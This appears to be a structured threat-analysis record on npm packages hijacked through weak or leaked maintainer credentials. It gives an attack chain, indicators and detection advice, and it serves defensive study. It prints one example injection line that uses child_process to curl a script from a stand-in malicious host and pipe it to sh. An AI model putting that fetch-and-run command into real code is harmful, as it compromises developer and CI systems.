package_info.package_name: Multiple npm packages (no single package, ecosystem-wide issue)
package_info.package_versions: All versions affected by weak credential accounts (no specific version, but up to June 2021)
package_info.why_malicious: The packages themselves were not inherently malicious, but weak or leaked credentials allowed attackers to hijack legitimate packages and inject malicious code, putting the entire npm ecosystem at risk.

execution_context.trigger: publish-time (when attacker gains access and publishes a new version)
execution_context.file_location: package.json, index.js, or any entry point of hijacked package

malicious_snippets.code_snippet:
// Example of malicious code injected after hijack
require('child_process').exec('curl http://malicious.site/evil.sh | sh');
malicious_snippets.code_behavior: Downloads and executes a remote shell script, potentially compromising the system or exfiltrating sensitive data.

malice_analysis.why_suspicious: The code executes a remote script from an untrusted source, which is a common method for malware delivery.
malice_analysis.violated_expectations: Legitimate packages should not execute arbitrary remote code during install or runtime.
malice_analysis.similar_legitimate_use: Some legitimate packages may download binaries or dependencies, but only from trusted, verified sources and with user awareness.
key_indicators: Use of child_process to execute shell commands
Fetching code from external, non-official domains
No user interaction or consent required

malicious_snippets.code_behavior: Automatically runs a malicious script after package installation, compromising developer or CI/CD environments.

malice_analysis.why_suspicious: Postinstall scripts are a common vector for supply chain attacks, as they run automatically and can execute arbitrary code.
malice_analysis.violated_expectations: Most packages do not require postinstall scripts, and those that do should not fetch and execute remote code.
malice_analysis.similar_legitimate_use: Some packages use postinstall for setup (e.g., compiling native modules), but not for remote code execution.
key_indicators: Presence of postinstall script fetching remote code
Obfuscated or minimized code in postinstall
No clear documentation for postinstall behavior

attack_chain.action: Attacker discovers and uses weak or leaked credentials to gain publish access to npm package.
attack_chain.leads_to: Ability to publish new, potentially malicious versions of the package.

attack_chain.action: Attacker publishes a new version of the package containing malicious code (e.g., remote code execution, data exfiltration).
attack_chain.leads_to: Malicious code is distributed to all users and projects depending on the package.

attack_chain.action: Malicious code executes on developer machines, CI/CD pipelines, or production servers during install or runtime.
attack_chain.leads_to: System compromise, data theft, or further propagation through dependency chains.

behavioral_signatures: Unexpected postinstall scripts in npm packages
Use of child_process or similar APIs to execute shell commands
Fetching and executing code from non-official or suspicious domains
Sudden changes in package behavior or content after a new version is published
file_indicators: package.json with suspicious or undocumented postinstall scripts
Injected or obfuscated code in main entry points (index.js, main.js, etc.)
References to external URLs in code or scripts
network_indicators: Outbound requests to domains not associated with the package's legitimate functionality
Connections to known malicious infrastructure (e.g., webhook.site, pastebin, or attacker-controlled servers)
detection_knowledge.how_to_detect: Monitor for unexpected postinstall scripts and use of child_process in npm packages, especially after maintainers change or new versions are published. Flag packages that fetch and execute remote code, or that make network requests to untrusted domains. Use static analysis to detect suspicious patterns in package.json and main code files. Alert on sudden, undocumented changes in popular packages, and monitor for credential leaks or weak passwords among maintainers.
